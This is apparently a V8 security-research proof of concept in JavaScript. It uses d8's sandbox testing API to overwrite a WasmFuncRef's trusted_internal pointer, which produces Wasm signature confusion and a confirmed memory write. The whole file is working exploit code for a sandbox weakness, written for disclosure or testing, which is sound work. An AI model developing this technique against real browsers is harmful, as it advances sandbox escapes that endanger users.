// C21 H27: WasmFuncRef.trusted_internal transplant gives in-bounds Wasm type
// confusion.
//
// Variant of the trusted_internal sink: transplant func0(i32)->i32 into the
// WasmFuncRef for func1(i64)->i32, then call_ref as func1. Instead of using an
// OOB address and proving only a trap, pass 0n and observe func0 executing and
// writing to memory[0].
//
// This proves the signature-confused body executes, but current impact remains
// bounded by Wasm memory checks.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();
builder.exportMemoryAs('mem0', 0);
builder.addMemory(1, 1);

let box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let sig_i_l = builder.addType(kSig_i_l);

builder.addFunction('func0', kSig_i_i).exportFunc().addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kExprI32StoreMem, 0, 0,
  ...wasmI32Const(0x55),
]);

builder.addFunction('func1', sig_i_l).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);

builder.addFunction('get_func0', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 0,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('get_func1', kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 1,
  kGCPrefix, kExprStructNew, box,
  kGCPrefix, kExprExternConvertAny,
]);

builder.addFunction('call_as_i_l', kSig_i_l).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprRefFunc, 1,
  kExprCallRef, sig_i_l,
]);

let instance = builder.instantiate();
let mem32 = new Uint32Array(instance.exports.mem0.buffer);

const kHeapObjectTag = 1;
const kStructField0Offset = 8;
const kWasmFuncRefType = Sandbox.getInstanceTypeIdFor('WASM_FUNC_REF_TYPE');
const kWasmFuncRefInternalOffset =
    Sandbox.getFieldOffset(kWasmFuncRefType, 'trusted_internal');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

print(`before_ret=${instance.exports.call_as_i_l(7n)}`);
print(`before_mem0=0x${mem32[0].toString(16)}`);

let f0Box = getPtr(instance.exports.get_func0());
let f0Ref = getField(f0Box, kStructField0Offset);
let f0Internal = getField(f0Ref, kWasmFuncRefInternalOffset);

let f1Box = getPtr(instance.exports.get_func1());
let f1Ref = getField(f1Box, kStructField0Offset);
setField(f1Ref, kWasmFuncRefInternalOffset, f0Internal);

let ret = instance.exports.call_as_i_l(0n);
print(`after_ret=0x${ret.toString(16)}`);
print(`after_mem0=0x${mem32[0].toString(16)}`);
